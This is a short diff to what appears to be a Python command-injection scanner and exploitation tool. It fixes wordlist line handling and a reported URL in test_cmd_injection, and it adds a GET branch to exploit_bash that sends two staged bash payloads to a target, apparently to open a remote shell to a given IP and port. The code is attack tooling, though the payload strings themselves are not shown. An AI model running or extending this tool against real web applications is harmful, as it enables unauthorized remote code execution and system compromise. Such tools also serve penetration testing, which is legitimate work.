@@ -210,11 +210,11 @@ def test_cmd_injection(url):
     if(not args.postreq):
         with open(cmdWordlist) as f:
             for line in f:
-                line = line[:-1]
+                line = line.replace("\n", "")
                 u = url.replace(args.param, line)
 
                 res = requests.get(u, headers = headers, proxies = proxies)
-                if(init(res, "GET", "RCE", url, "", headers, "CMD")):
+                if(init(res, "GET", "RCE", u, "", headers, "CMD")):
                     break
     else:
         with open(cmdWordlist) as f:
@@ -544,6 +544,9 @@ def exploit_bash(exploit, method, ip, port):
             if(args.postreq):
                 requests.post(url, data = post.replace(tempArg, bashPayloadStageOne), headers = headers, proxies = proxies)
                 requests.post(url, data = post.replace(tempArg, bashPayloadStageTwo), headers = headers, proxies = proxies)
+            else: 
+                requests.get(url.replace(tempArg, bashPayloadStageOne), headers = headers, proxies = proxies)
+                requests.get(url.replace(tempArg, bashPayloadStageTwo), headers = headers, proxies = proxies)
             return True
 
 def exploit_nc(exploit, method, ip, port):
